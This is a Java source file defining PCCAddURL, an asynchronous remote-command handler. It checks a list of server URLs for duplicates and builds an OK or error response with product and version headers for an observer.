package com.vvt.rmtcmd.pcc;

import java.util.Vector;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCAddURL extends PCCRmtCmdAsync {
		
	private Vector listServerUrl = null;
	
	public PCCAddURL(Vector listServerUrl) {
		this.listServerUrl = listServerUrl;
	}
	
	private void doPCCHeader() {
		responseMessage.delete(0, responseMessage.length());
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(PhoenixCompliantCommand.ADD_URL.getId());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		doPCCHeader();
		try {
			if (isDuplicateUrl(listServerUrl)) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.DUPLICATE_URL);		
			} else {
				responseMessage.append(Constant.OK);	
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
